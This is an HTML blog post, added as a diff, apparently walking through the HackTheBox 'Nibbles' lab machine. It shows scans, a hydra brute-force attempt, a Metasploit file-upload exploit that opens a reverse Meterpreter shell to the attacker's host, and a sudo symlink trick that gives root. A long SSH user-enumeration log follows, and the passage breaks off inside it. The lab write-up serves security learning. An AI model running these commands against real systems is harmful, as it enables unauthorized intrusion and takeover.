@@ -1,0 +1,643 @@
+<!DOCTYPE html>
+<html lang="en-us"><head>
+    <meta charset="utf-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+
+    <meta name="generator" content="Hugo 0.76.5" />
+
+    <link rel="apple-touch-icon" sizes="180x180" href="https://shiny-labs.re/apple-touch-icon.png">
+    <link rel="icon" type="image/png" sizes="32x32" href="https://shiny-labs.re/favicon-32x32.png">
+    <link rel="icon" type="image/png" sizes="16x16" href="https://shiny-labs.re/favicon-16x16.png">
+    <link rel="manifest" href="https://shiny-labs.re/site.webmanifest">
+    <link rel="mask-icon" href="https://shiny-labs.re/safari-pinned-tab.svg" color="#000000">
+    <meta name="msapplication-TileColor" content="#ffffff">
+    <meta name="theme-color" content="#ffffff">
+
+
+    <link rel="stylesheet" href="https://shiny-labs.re/css/bulma.min.css">
+    <link rel="stylesheet" href="https://shiny-labs.re/css/main.css">
+    <link rel="stylesheet" href="https://shiny-labs.re/css/syntax.css">
+
+    
+    <title>shiny-labs || HackTheBox - Nibbles</title>
+</head>
+<body><nav class="navbar" role="navigation" aria-label="main navigation">
+    <div class="navbar-brand">
+        <a class="navbar-item no-squiggly" href="https://shiny-labs.re/">
+            <h1 id="logo" class="glitch">shiny-labs</h1>
+        </a>
+    </div>
+
+    <div class="navbar-menu">
+        <div class="navbar-start">
+            
+        </div>
+
+        <div class="navbar-end">
+            
+            <h3 id="subtitle">Exploit, reverse engineering and cats.</h3>
+        </div>
+    </div>
+</nav>
+
+<div id="content">
+
+            <div class="columns is-centered">
+                <div class="column is-three-fifths" id="menu-column"><div id="menu" class="tabs is-centered is-medium">
+    <ul>
+            <li><a href="https://shiny-labs.re/" class="no-squiggly">Home</a></li>
+            <li><a href="https://shiny-labs.re/archives/" class="no-squiggly">Archives</a></li>
+            <li><a href="https://shiny-labs.re/tags/" class="no-squiggly">Tags</a></li>
+            <li><a href="https://shiny-labs.re/about/" class="no-squiggly">About</a></li>
+  </ul>
+</div>
+
+<div class="columns">
+<div class="column is-10" id="main-column">
+    <article class="article">
+        <div >
+            <h1 class="article-title">HackTheBox - Nibbles</h1>
+            
+<div class="post-meta">
+  <p class="article-meta">
+  <span>Date</span> &#x5b;
+  <time datetime="October 29, 2020">
+      Oct 29
+    </time>
+  &#x5d;
+        
+        
+  <span>Categories</span> &#x5b;
+    <a href="https://shiny-labs.re/categories/pentest">pentest</a>
+  &#x5d;
+        
+        
+  <span>Series</span> &#x5b;
+    <a href="https://shiny-labs.re/series/hackthebox">hackthebox</a>
+  &#x5d;
+        
+        
+  <span>Tags</span> &#x5b;
+    <a href="https://shiny-labs.re/tags/linux">linux</a>
+  &#x5d;
+  </p>
+</div>
+
+        </div>
+        <div>
+            <p><img src="img/image-20201027190310929.png" alt="image-20201027190310929"></p>
+<h1 id="reconnaissance">Reconnaissance</h1>
+<p>Run our usual scan against TCP ports to find services:</p>
+<div class="highlight"><pre class="chroma"><code class="language-fallback" data-lang="fallback"># nmap -sC -sV -oA nmap_tcp -p- $TARGET
+Starting Nmap 7.80 ( https://nmap.org ) at 2020-10-26 22:43 CET
+Nmap scan report for 10.10.10.75
+Host is up (0.039s latency).
+Not shown: 65533 closed ports
+PORT   STATE SERVICE VERSION
+22/tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.2 (Ubuntu Linux; protocol 2.0)
+| ssh-hostkey:
+|   2048 c4:f8:ad:e8:f8:04:77:de:cf:15:0d:63:0a:18:7e:49 (RSA)
+|   256 22:8f:b1:97:bf:0f:17:08:fc:7e:2c:8f:e9:77:3a:48 (ECDSA)
+|_  256 e6:ac:27:a3:b5:a9:f1:12:3c:34:a5:5d:5b:eb:3d:e9 (ED25519)
+80/tcp open  http    Apache httpd 2.4.18 ((Ubuntu))
+|_http-server-header: Apache/2.4.18 (Ubuntu)
+|_http-title: Site doesn&#39;t have a title (text/html).
+Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
+
+Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+Nmap done: 1 IP address (1 host up) scanned in 65.27 seconds
+</code></pre></div><p>A scan on UDP didn&rsquo;t reveal any additional services:</p>
+<div class="highlight"><pre class="chroma"><code class="language-fallback" data-lang="fallback">nmap -sU -p- -oA nmap_udp $TARGET
+</code></pre></div><h1 id="enumeration">Enumeration</h1>
+<table>
+<thead>
+<tr>
+<th>Port</th>
+<th>Service</th>
+<th>Version</th>
+<th>Vuln?</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>22/tcp</td>
+<td>ssh</td>
+<td>OpenSSH 7.2p2 Ubuntu 4ubuntu2.2 (Ubuntu Linux; protocol 2.0)</td>
+<td>no</td>
+</tr>
+<tr>
+<td>80/tcp</td>
+<td>http</td>
+<td>Apache/2.4.18 (Ubuntu)</td>
+<td>no</td>
+</tr>
+<tr>
+<td></td>
+<td>http</td>
+<td>Nibbleblog v.4.0.3</td>
+<td>yes, nibbleblog_file_upload<!-- raw HTML omitted -->needs an auth account: <code>admin:nibbles</code></td>
+</tr>
+</tbody>
+</table>
+<p>OS: Ubuntu</p>
+<h1 id="initial-foothold">Initial Foothold</h1>
+<p>Let&rsquo;s have a look at that webserver first!</p>
+<p>Visiting the URL: http://10.10.10.75, there&rsquo;s not much going on there&hellip;</p>
+<p><img src="img/image-20201026225502925.png" alt="image-20201026225502925"></p>
+<p>BUT. Wait a minute! There&rsquo;s a comment in the source code!</p>
+<div class="highlight"><pre class="chroma"><code class="language-html" data-lang="html"><span class="p">&lt;</span><span class="nt">b</span><span class="p">&gt;</span>Hello world!<span class="p">&lt;/</span><span class="nt">b</span><span class="p">&gt;</span>
+
+<span class="c">&lt;!-- /nibbleblog/ directory. Nothing interesting here! --&gt;</span>
+</code></pre></div><p>Visiting http://10.10.10.75/nibbleblog is our next move! Charming, albeit a bit empty blog :/</p>
+<p><img src="img/image-20201026225648875.png" alt="image-20201026225648875"></p>
+<p>Let&rsquo;s fire a gobuster scan to find hidden directories:</p>
+<ul>
+<li><code>-u</code> is the target URL</li>
+<li><code>-w</code> the wordlist to use</li>
+<li><code>-o</code> the name of the output file</li>
+</ul>
+<div class="highlight"><pre class="chroma"><code class="language-fallback" data-lang="fallback">$ gobuster dir -u http://10.10.10.75/nibbleblog -w /usr/share/dirb/wordlists/big.txt -o gobuster_big
+===============================================================
+Gobuster v3.1.0
+by OJ Reeves (@TheColonial) &amp; Christian Mehlmauer (@firefart)
+===============================================================
+[+] Url:            http://10.10.10.75/nibbleblog
+[+] Method:         GET
+[+] Threads:        10
+[+] Wordlist:       /usr/share/dirb/wordlists/big.txt
+[+] Status codes:   200,204,301,302,307,401,403
+[+] User Agent:     gobuster/3.1.0
+[+] Timeout:        10s
+===============================================================
+2020/10/26 23:13:25 Starting gobuster in directory enumeration mode
+===============================================================
+/.htaccess (Status: 403)
+/.htpasswd (Status: 403)
+/README (Status: 200)
+/admin (Status: 301)
+/content (Status: 301)
+/languages (Status: 301)
+/plugins (Status: 301)
+/themes (Status: 301)
+
+===============================================================
+2020/10/26 23:14:53 Finished
+===============================================================
+
+</code></pre></div><p>The README page contains some informations: the blog engine is nibbleblog v.4.0.3</p>
+<p><img src="img/image-20201026231931493.png" alt="image-20201026231931493"></p>
+<p>This version of nibbleblog is affected by a vulnerability which could be very interesting: <a href="https://packetstormsecurity.com/files/133425/NibbleBlog-4.0.3-Shell-Upload.html">https://packetstormsecurity.com/files/133425/NibbleBlog-4.0.3-Shell-Upload.html</a></p>
+<blockquote>
+<ol start="2">
+<li>Vulnerability Description</li>
+</ol>
+<p>When uploading image files via the &ldquo;My image&rdquo; plugin - which is
+delivered with NibbleBlog by default - , NibbleBlog 4.0.3 keeps the
+original extension of uploaded files. This extension or the actual file
+type are not checked, thus it is possible to upload PHP files and gain
+code execution.</p>
+<p>Please note that admin credentials are required.</p>
+</blockquote>
+<p>There&rsquo;s just one tiny-tiny problem: the admin credentials.</p>
+<p>See, the metasploit module requires a username and a password</p>
+<div class="highlight"><pre class="chroma"><code class="language-fallback" data-lang="fallback">msf5 &gt; use exploit/multi/http/nibbleblog_file_upload
+[*] No payload configured, defaulting to php/meterpreter/reverse_tcp
+msf5 exploit(multi/http/nibbleblog_file_upload) &gt; show options
+
+Module options (exploit/multi/http/nibbleblog_file_upload):
+
+   Name       Current Setting  Required  Description
+   ----       ---------------  --------  -----------
+   PASSWORD                    yes       The password to authenticate with
+   Proxies                     no        A proxy chain of format type:host:port[,type:host:port][...]
+   RHOSTS                      yes       The target host(s), range CIDR identifier, or hosts file with syntax &#39;file:&lt;path&gt;&#39;
+   RPORT      80               yes       The target port (TCP)
+   SSL        false            no        Negotiate SSL/TLS for outgoing connections
+   TARGETURI  /                yes       The base path to the web application
+   USERNAME                    yes       The username to authenticate with
+   VHOST                       no        HTTP server virtual host
+
+
+Payload options (php/meterpreter/reverse_tcp):
+
+   Name   Current Setting  Required  Description
+   ----   ---------------  --------  -----------
+   LHOST  172.16.149.138   yes       The listen address (an interface may be specified)
+   LPORT  4444             yes       The listen port
+
+
+Exploit target:
+
+   Id  Name
+   --  ----
+   0   Nibbleblog 4.0.3
+</code></pre></div><p>Dead end here, we don&rsquo;t have an account yet, let&rsquo;s go explore other URLS!</p>
+<p>From the github sources on <a href="https://github.com/dignajar/nibbleblog,">https://github.com/dignajar/nibbleblog,</a> let&rsquo;s try a couple of default pages. Like maybe the installation page http://10.10.10.75/nibbleblog/install.php has something?</p>
+<p><img src="img/image-20201027000534174.png" alt="image-20201027000534174"></p>
+<p>Nope. Then http://10.10.10.75/nibbleblog/update.php  maybe?</p>
+<p><img src="img/image-20201027000648910.png" alt="image-20201027000648910"></p>
+<p>Nope nope nope. What about the login page? http://10.10.10.75/nibbleblog/admin.php</p>
+<p><img src="img/image-20201027000807488.png" alt="image-20201027000807488"></p>
+<p>AHAH. We found the login page!</p>
+<p>Let&rsquo;s continue exploring and check out some URLS from the gobuster scan results</p>
+<p>For example&hellip; http://10.10.10.75/nibbleblog/admin is pretty interesting</p>
+<p><img src="img/image-20201026233012820.png" alt="image-20201026233012820"></p>
+<p>http://10.10.10.75/nibbleblog/content/private/users.xml</p>
+<p><img src="img/image-20201026233550298.png" alt="image-20201026233550298"></p>
+<p>Yay, found a username here: <code>admin</code></p>
+<p>Sadly, neither <a href="http://10.10.10.75/nibbleblog/content/private/shadow.php">shadow.php</a> nor <a href="http://10.10.10.75/nibbleblog/content/private/keys.php">keys.php</a> are available :(( But hey, I found a&hellip; <a href="http://10.10.10.75/nibbleblog/content/public/upload/nibbles_0_o.jpg">thing</a></p>
+<p><img src="img/image-20201026233839366.png" alt="image-20201026233839366"></p>
+<p>So&hellip; we have the login page, a potential username. All we are missing is the password &gt;.&lt;</p>
+<p>Let&rsquo;s ask the evil search engine if he knows about default credentials for nibbleblog&hellip;</p>
+<p><img src="img/image-20201026235425295.png" alt="image-20201026235425295"></p>
+<p>Lol. That was one hell of a spoiler. Huh. Thanks, I hate that <code>Featured Snippets</code> .</p>
+<p>/tableflip because I hate spoilers. Comes back, try the creds: <code>admin</code>:<code>123456</code> and&hellip; THEY ARE WRONG.</p>
+<p><img src="img/image-20201027000000052.png" alt="image-20201027000000052"></p>
+<p>Sooooo, fake spoiler. What an emotional rollercoster. The hunt for the password is still on!</p>
+<p>on! So&hellip; Bruteforce maybe?</p>
+<p>Hydra can help bruteforcing the login page, we just need to gather a few information first. Using Firefox developer tools, in the network tab, right clic on a request and select <code>Edit and Resend</code>  to retrieve the request body: <code>username=admin&amp;password=admin</code></p>
+<p><img src="img/image-20201027183854349.png" alt="image-20201027183854349"></p>
+<p>Options for bruteforcing a HTML post form with hydra:</p>
+<ul>
+<li><code>-l admin</code> to specify a single username ( <code>-L</code> for a list of usernames)</li>
+<li><code>-P /usr/share/dict/rockyou.txt</code> to specify a list of passwords (<code>-p</code> for a single password)</li>
+<li>IP address</li>
+<li>http-post-form <code>&lt;login page&gt;:&lt;request body&gt;:&lt;error message&gt;</code></li>
+</ul>
+<div class="highlight"><pre class="chroma"><code class="language-fallback" data-lang="fallback">$ hydra -l admin -P /usr/share/dict/rockyou.txt 10.10.10.75 http-post-form &#34;/nibbleblog/admin.php:username=^USER^&amp;password=^PASS^:F=Incorrect username or password.&#34;
+Hydra v9.0 (c) 2019 by van Hauser/THC - Please do not use in military or secret service organizations, or for illegal purposes.
+
+Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2020-10-27 18:47:08
+[DATA] max 16 tasks per 1 server, overall 16 tasks, 14344409 login tries (l:1/p:14344409), ~896526 tries per task
+[DATA] attacking http-post-form://10.10.10.75:80/nibbleblog/admin.php:username=^USER^&amp;password=^PASS^:F=Incorrect username or password.
+[80][http-post-form] host: 10.10.10.75   login: admin   password:
+[80][http-post-form] host: 10.10.10.75   login: admin   password:
+[80][http-post-form] host: 10.10.10.75   login: admin   password:
+[80][http-post-form] host: 10.10.10.75   login: admin   password:
+[80][http-post-form] host: 10.10.10.75   login: admin   password:
+[80][http-post-form] host: 10.10.10.75   login: admin   password:
+[80][http-post-form] host: 10.10.10.75   login: admin   password:
+[80][http-post-form] host: 10.10.10.75   login: admin   password:
+[80][http-post-form] host: 10.10.10.75   login: admin   password:
+[80][http-post-form] host: 10.10.10.75   login: admin   password: !
+[80][http-post-form] host: 10.10.10.75   login: admin   password: !   !
+[80][http-post-form] host: 10.10.10.75   login: admin   password: !!!!
+[80][http-post-form] host: 10.10.10.75   login: admin   password: !!!!!
+[80][http-post-form] host: 10.10.10.75   login: admin   password: !!!!!!
+[80][http-post-form] host: 10.10.10.75   login: admin
+1 of 1 target successfully completed, 15 valid passwords found
+Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2020-10-27 18:47:10
+</code></pre></div><p>Well, bruteforce is going well! 16 tries, 16 false-positives! Checking out the admin.php page after hydra confirms that bruteforce with hydra is not going to be an option&hellip;</p>
+<p><img src="img/image-20201027185317688.png" alt="image-20201027185317688"></p>
+<p>Okay, I&rsquo;m out of ideas, let&rsquo;s peak at a write-up on how to unlock the rest&hellip;</p>
+<p>Well damn. You&rsquo;re supposed to guess that the password is <code>nibbles</code>. I could have searched for hours I think&hellip; I tried simple passwords like <code>admin:admin</code> and <code>nibbles:nibbles</code> but I never mixed them :( Anyway, we now have access to the nibbleblog dashboard!</p>
+<p><img src="img/image-20201027191109365.png" alt="image-20201027191109365"></p>
+<p>We can fire our metasploit module previously found now!</p>
+<div class="highlight"><pre class="chroma"><code class="language-fallback" data-lang="fallback">msf5 &gt; use exploit/multi/http/nibbleblog_file_upload
+msf5 exploit(multi/http/nibbleblog_file_upload) &gt; set PASSWORD nibbles
+PASSWORD =&gt; nibbles
+msf5 exploit(multi/http/nibbleblog_file_upload) &gt; set USERNAME admin
+USERNAME =&gt; admin
+msf5 exploit(multi/http/nibbleblog_file_upload) &gt; set LHOST tun0
+LHOST =&gt; tun0
+msf5 exploit(multi/http/nibbleblog_file_upload) &gt; set RHOSTS 10.10.10.75
+RHOSTS =&gt; 10.10.10.75
+msf5 exploit(multi/http/nibbleblog_file_upload) &gt; set TARGETURI /nibbleblog
+TARGETURI =&gt; /nibbleblog
+msf5 exploit(multi/http/nibbleblog_file_upload) &gt; run
+
+[*] Started reverse TCP handler on 10.10.14.13:4444
+[*] Sending stage (38288 bytes) to 10.10.10.75
+[*] Meterpreter session 1 opened (10.10.14.13:4444 -&gt; 10.10.10.75:52970) at 2020-10-27 19:18:56 +0100
+[+] Deleted image.php
+meterpreter &gt;
+</code></pre></div><p>Okay, we&rsquo;ve got a sheeeeell! Non-privileged, but it&rsquo;s a starting point :D</p>
+<div class="highlight"><pre class="chroma"><code class="language-fallback" data-lang="fallback">meterpreter &gt; getuid
+Server username: nibbler (1001)
+meterpreter &gt; sysinfo
+Computer    : Nibbles
+OS          : Linux Nibbles 4.4.0-104-generic #127-Ubuntu SMP Mon Dec 11 12:16:42 UTC 2017 x86_64
+Meterpreter : php/linux
+</code></pre></div><p>And since we&rsquo;re here, why not have a look at <code>personal.zip</code></p>
+<div class="highlight"><pre class="chroma"><code class="language-fallback" data-lang="fallback">meterpreter &gt; download personal.zip
+[*] Downloading: personal.zip -&gt; personal.zip
+[*] Downloaded 1.81 KiB of 1.81 KiB (100.0%): personal.zip -&gt; personal.zip
+[*] download   : personal.zip -&gt; personal.zip
+</code></pre></div><h1 id="privilege-escalation">Privilege Escalation</h1>
+<p>So <code>personal.zip</code> contains a <code>monitor.sh</code> file (which is a copy of Tecmint_monitor.sh)&hellip;</p>
+<div class="highlight"><pre class="chroma"><code class="language-fallback" data-lang="fallback">$ unzip -l personal.zip
+Archive:  personal.zip
+  Length      Date    Time    Name
+---------  ---------- -----   ----
+        0  2017-12-11 03:58   personal/
+        0  2017-12-11 04:05   personal/stuff/
+     4015  2015-05-08 09:17   personal/stuff/monitor.sh
+---------                     -------
+     4015                     3 files
+</code></pre></div><p>Doing some reconnaissance, it&rsquo;s a good idea to check <code>sudo</code> as it can be an effective privesc.</p>
+<div class="highlight"><pre class="chroma"><code class="language-fallback" data-lang="fallback">nibbler@Nibbles:/home/nibbler$ sudo -V
+sudo -V
+sudo: Sudo version 1.8.16
+Sudoers policy plugin version 1.8.16
+Sudoers file grammar version 45
+Sudoers I/O plugin version 1.8.16
+unable to resolve host Nibbles: Connection timed out
+nibbler@Nibbles:/home/nibbler$ sudo -l
+sudo -l
+sudo: unable to resolve host Nibbles: Connection timed out
+Matching Defaults entries for nibbler on Nibbles:
+    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin
+
+User nibbler may run the following commands on Nibbles:
+    (root) NOPASSWD: /home/nibbler/personal/stuff/monitor.sh
+</code></pre></div><p>Note: DNS resolution times out here, which makes sudo&hellip; extremely slow&hellip; Be patient when waiting for the output :D</p>
+<p>Very interesting! That means we are allowed to run <code>/home/nibbler/personal/stuff/monitor.sh</code> as root without sudo asking for a password. That file doesn&rsquo;t exists in <code>/home/nibbler</code> What if I put a symlink to a shell instead of that monitor.sh script?</p>
+<div class="highlight"><pre class="chroma"><code class="language-fallback" data-lang="fallback">nibbler@Nibbles:~$ cd /home/nibbler
+nibbler@Nibbles:~$ mkdir -p personal/stuff
+nibbler@Nibbles:~$ cd personal/stuff
+nibbler@Nibbles:/home/nibbler/personal/stuff$ ln -s /bin/bash monitor.sh
+</code></pre></div><p>Now, run our only allowed sudo command [note: the syntax must be exactly the same than in the output of <code>sudo -l</code>, ie using a relative path like <code>sudo monitor.sh</code> will not work].</p>
+<div class="highlight"><pre class="chroma"><code class="language-fallback" data-lang="fallback">nibbler@Nibbles:/home/nibbler$  sudo /home/nibbler/personal/stuff/monitor.sh
+sudo: unable to resolve host Nibbles: Connection timed out
+id
+uid=0(root) gid=0(root) groups=0(root)
+cd /root
+ls
+root.txt
+</code></pre></div><p>Booooom. Root shell.</p>
+<h1 id="deadends">Deadends</h1>
+<h2 id="ssh">SSH</h2>
+<h3 id="enumusers">enumusers</h3>
+<p>Using the <code>ssh_enumusers</code> from Metasploit to lists potential weak SSH users =&gt; there&rsquo;s only accounts usually present on a Linux like <code>root</code>, <code>mail</code>, &hellip;</p>
+<div class="highlight"><pre class="chroma"><code class="language-fallback" data-lang="fallback">msf5 &gt; use auxiliary/scanner/ssh/ssh_enumusers
+msf5 auxiliary(scanner/ssh/ssh_enumusers) &gt; show options
+
+Module options (auxiliary/scanner/ssh/ssh_enumusers):
+
+   Name         Current Setting  Required  Description
+   ----         ---------------  --------  -----------
+   CHECK_FALSE  false            no        Check for false positives (random username)
+   Proxies                       no        A proxy chain of format type:host:port[,type:host:port][...]
+   RHOSTS                        yes       The target host(s), range CIDR identifier, or hosts file with syntax &#39;file:&lt;path&gt;&#39;
+   RPORT        22               yes       The target port
+   THREADS      1                yes       The number of concurrent threads (max one per host)
+   THRESHOLD    10               yes       Amount of seconds needed before a user is considered found (timing attack only)
+   USERNAME                      no        Single username to test (username spray)
+   USER_FILE                     no        File containing usernames, one per line
+
+
+Auxiliary action:
+
+   Name              Description
+   ----              -----------
+   Malformed Packet  Use a malformed packet
+
+
+msf5 auxiliary(scanner/ssh/ssh_enumusers) &gt; set RHOSTS 10.10.10.75
+RHOSTS =&gt; 10.10.10.75
+msf5 auxiliary(scanner/ssh/ssh_enumusers) &gt; set USER_FILE /opt/metasploit/data/wordlists/unix_users.txt
+USER_FILE =&gt; /opt/metasploit/data/wordlists/unix_users.txt
+msf5 auxiliary(scanner/ssh/ssh_enumusers) &gt; run
+
+[*] 10.10.10.75:22 - SSH - Using malformed packet technique
+[*] 10.10.10.75:22 - SSH - Starting scan
+[-] 10.10.10.75:22 - SSH - User &#39;4Dgifts&#39; not found
+[-] 10.10.10.75:22 - SSH - User &#39;abrt&#39; not found
+[-] 10.10.10.75:22 - SSH - User &#39;adm&#39; not found
+[-] 10.10.10.75:22 - SSH - User &#39;admin&#39; not found
+[-] 10.10.10.75:22 - SSH - User &#39;administrator&#39; not found
+[-] 10.10.10.75:22 - SSH - User &#39;anon&#39; not found
+[+] 10.10.10.75:22 - SSH - User &#39;_apt&#39; found
+[-] 10.10.10.75:22 - SSH - User &#39;arpwatch&#39; not found
+[-] 10.10.10.75:22 - SSH - User &#39;auditor&#39; not found
+[-] 10.10.10.75:22 - SSH - User &#39;avahi&#39; not found
+[-] 10.10.10.75:22 - SSH - User &#39;avahi-autoipd&#39; not found
+[+] 10.10.10.75:22 - SSH - User &#39;backup&#39; found
+[-] 10.10.10.75:22 - SSH - User &#39;bbs&#39; not found
+[-] 10.10.10.75:22 - SSH - User &#39;beef-xss&#39; not found
+[+] 10.10.10.75:22 - SSH - User &#39;bin&#39; found
+[-] 10.10.10.75:22 - SSH - User &#39;bitnami&#39; not found
+[-] 10.10.10.75:22 - SSH - User &#39;checkfs&#39; not found
+[-] 10.10.10.75:22 - SSH - User &#39;checkfsys&#39; not found
+[-] 10.10.10.75:22 - SSH - User &#39;checksys&#39; not found
+[-] 10.10.10.75:22 - SSH - User &#39;chronos&#39; not found
+[-] 10.10.10.75:22 - SSH - User &#39;chrony&#39; not found
+[-] 10.10.10.75:22 - SSH - User &#39;cmwlogin&#39; not found
+[-] 10.10.10.75:22 - SSH - User &#39;cockpit-ws&#39; not found
+[-] 10.10.10.75:22 - SSH - User &#39;colord&#39; not found
+[-] 10.10.10.75:22 - SSH - User &#39;couchdb&#39; not found
+[-] 10.10.10.75:22 - SSH - User &#39;cups-pk-helper&#39; not found
+[+] 10.10.10.75:22 - SSH - User &#39;daemon&#39; found
+[-] 10.10.10.75:22 - SSH - User &#39;dbadmin&#39; not found
+[-] 10.10.10.75:22 - SSH - User &#39;dbus&#39; not found
+[-] 10.10.10.75:22 - SSH - User &#39;Debian-exim&#39; not found
+[-] 10.10.10.75:22 - SSH - User &#39;Debian-snmp&#39; not found
+[-] 10.10.10.75:22 - SSH - User &#39;demo&#39; not found
+[-] 10.10.10.75:22 - SSH - User &#39;demos&#39; not found
+[-] 10.10.10.75:22 - SSH - User &#39;diag&#39; not found
+[-] 10.10.10.75:22 - SSH - User &#39;distccd&#39; not found
+[-] 10.10.10.75:22 - SSH - User &#39;dni&#39; not found
+[+] 10.10.10.75:22 - SSH - User &#39;dnsmasq&#39; found
+[-] 10.10.10.75:22 - SSH - User &#39;dradis&#39; not found
+[-] 10.10.10.75:22 - SSH - User &#39;EZsetup&#39; not found
+[-] 10.10.10.75:22 - SSH - User &#39;fal&#39; not found
+[-] 10.10.10.75:22 - SSH - User &#39;fax&#39; not found
+[-] 10.10.10.75:22 - SSH - User &#39;ftp&#39; not found
+[+] 10.10.10.75:22 - SSH - User &#39;games&#39; found
+[-] 10.10.10.75:22 - SSH - User &#39;gdm&#39; not found
+[-] 10.10.10.75:22 - SSH - User &#39;geoclue&#39; not found
+[+] 10.10.10.75:22 - SSH - User &#39;gnats&#39; found
+[-] 10.10.10.75:22 - SSH - User &#39;gnome-initial-setup&#39; not found
+[-] 10.10.10.75:22 - SSH - User &#39;gopher&#39; not found
+[-] 10.10.10.75:22 - SSH - User &#39;gropher&#39; not found
+[-] 10.10.10.75:22 - SSH - User &#39;guest&#39; not found
+[-] 10.10.10.75:22 - SSH - User &#39;haldaemon&#39; not found
+[-] 10.10.10.75:22 - SSH - User &#39;halt&#39; not found
+[-] 10.10.10.75:22 - SSH - User &#39;hplip&#39; not found
+[-] 10.10.10.75:22 - SSH - User &#39;inetsim&#39; not found
+[-] 10.10.10.75:22 - SSH - User &#39;informix&#39; not found
+[-] 10.10.10.75:22 - SSH - User &#39;install&#39; not found
+[-] 10.10.10.75:22 - SSH - User &#39;iodine&#39; not found
+[+] 10.10.10.75:22 - SSH - User &#39;irc&#39; found
+[-] 10.10.10.75:22 - SSH - User &#39;jet&#39; not found
+[-] 10.10.10.75:22 - SSH - User &#39;karaf&#39; not found
+[-] 10.10.10.75:22 - SSH - User &#39;kernoops&#39; not found
+[-] 10.10.10.75:22 - SSH - User &#39;king-phisher&#39; not found
+[-] 10.10.10.75:22 - SSH - User &#39;landscape&#39; not found
+[-] 10.10.10.75:22 - SSH - User &#39;libstoragemgmt&#39; not found
+[-] 10.10.10.75:22 - SSH - User &#39;libuuid&#39; not found
+[-] 10.10.10.75:22 - SSH - User &#39;lightdm&#39; not found
+[+] 10.10.10.75:22 - SSH - User &#39;list&#39; found
+[-] 10.10.10.75:22 - SSH - User &#39;listen&#39; not found
+[+] 10.10.10.75:22 - SSH - User &#39;lp&#39; found
+[-] 10.10.10.75:22 - SSH - User &#39;lpadm&#39; not found
+[-] 10.10.10.75:22 - SSH - User &#39;lpadmin&#39; not found
+[+] 10.10.10.75:22 - SSH - User &#39;lxd&#39; found
+[-] 10.10.10.75:22 - SSH - User &#39;lynx&#39; not found
+[+] 10.10.10.75:22 - SSH - User &#39;mail&#39; found
+[+] 10.10.10.75:22 - SSH - User &#39;man&#39; found
+[-] 10.10.10.75:22 - SSH - User &#39;me&#39; not found
+[+] 10.10.10.75:22 - SSH - User &#39;messagebus&#39; found
+[-] 10.10.10.75:22 - SSH - User &#39;miredo&#39; not found
+[-] 10.10.10.75:22 - SSH - User &#39;mountfs&#39; not found
+[-] 10.10.10.75:22 - SSH - User &#39;mountfsys&#39; not found
+[-] 10.10.10.75:22 - SSH - User &#39;mountsys&#39; not found
+[+] 10.10.10.75:22 - SSH - User &#39;mysql&#39; found
+[+] 10.10.10.75:22 - SSH - User &#39;news&#39; found
+[-] 10.10.10.75:22 - SSH - User &#39;noaccess&#39; not found
+[+] 10.10.10.75:22 - SSH - User &#39;nobody&#39; found
+[-] 10.10.10.75:22 - SSH - User &#39;nobody4&#39; not found
+[-] 10.10.10.75:22 - SSH - User &#39;ntp&#39; not found
+[-] 10.10.10.75:22 - SSH - User &#39;nuucp&#39; not found
+[-] 10.10.10.75:22 - SSH - User &#39;nxautomation&#39; not found
+[-] 10.10.10.75:22 - SSH - User &#39;nxpgsql&#39; not found
+[-] 10.10.10.75:22 - SSH - User &#39;omi&#39; not found
+[-] 10.10.10.75:22 - SSH - User &#39;omsagent&#39; not found
+[-] 10.10.10.75:22 - SSH - User &#39;operator&#39; not found
+[-] 10.10.10.75:22 - SSH - User &#39;oracle&#39; not found
+[-] 10.10.10.75:22 - SSH - User &#39;OutOfBox&#39; not found
+[-] 10.10.10.75:22 - SSH - User &#39;pi&#39; not found
+[-] 10.10.10.75:22 - SSH - User &#39;polkitd&#39; not found
+[-] 10.10.10.75:22 - SSH - User &#39;pollinate&#39; not found
+[-] 10.10.10.75:22 - SSH - User &#39;popr&#39; not found
+[-] 10.10.10.75:22 - SSH - User &#39;postfix&#39; not found
+[-] 10.10.10.75:22 - SSH - User &#39;postgres&#39; not found
+[-] 10.10.10.75:22 - SSH - User &#39;postmaster&#39; not found
+[-] 10.10.10.75:22 - SSH - User &#39;printer&#39; not found
+[+] 10.10.10.75:22 - SSH - User &#39;proxy&#39; found
+[-] 10.10.10.75:22 - SSH - User &#39;pulse&#39; not found
+[-] 10.10.10.75:22 - SSH - User &#39;redsocks&#39; not found
+[-] 10.10.10.75:22 - SSH - User &#39;rfindd&#39; not found
+[-] 10.10.10.75:22 - SSH - User &#39;rje&#39; not found
+[+] 10.10.10.75:22 - SSH - User &#39;root&#39; found
+[-] 10.10.10.75:22 - SSH - User &#39;ROOT&#39; not found
+[-] 10.10.10.75:22 - SSH - User &#39;rooty&#39; not found
+[-] 10.10.10.75:22 - SSH - User &#39;rpc&#39; not found
+[-] 10.10.10.75:22 - SSH - User &#39;rpcuser&#39; not found
+[-] 10.10.10.75:22 - SSH - User &#39;rtkit&#39; not found
+[-] 10.10.10.75:22 - SSH - User &#39;rwhod&#39; not found
+[-] 10.10.10.75:22 - SSH - User &#39;saned&#39; not found
+[-] 10.10.10.75:22 - SSH - User &#39;service&#39; not found
+[-] 10.10.10.75:22 - SSH - User &#39;setroubleshoot&#39; not found
+[-] 10.10.10.75:22 - SSH - User &#39;setup&#39; not found
+[-] 10.10.10.75:22 - SSH - User &#39;sgiweb&#39; not found
+[-] 10.10.10.75:22 - SSH - User &#39;shutdown&#39; not found
+[-] 10.10.10.75:22 - SSH - User &#39;sigver&#39; not found
+[-] 10.10.10.75:22 - SSH - User &#39;speech-dispatcher&#39; not found
+[+] 10.10.10.75:22 - SSH - User &#39;sshd&#39; found
+[-] 10.10.10.75:22 - SSH - User &#39;sslh&#39; not found
+[-] 10.10.10.75:22 - SSH - User &#39;sssd&#39; not found
+[-] 10.10.10.75:22 - SSH - User &#39;stunnel4&#39; not found
+[-] 10.10.10.75:22 - SSH - User &#39;sym&#39; not found
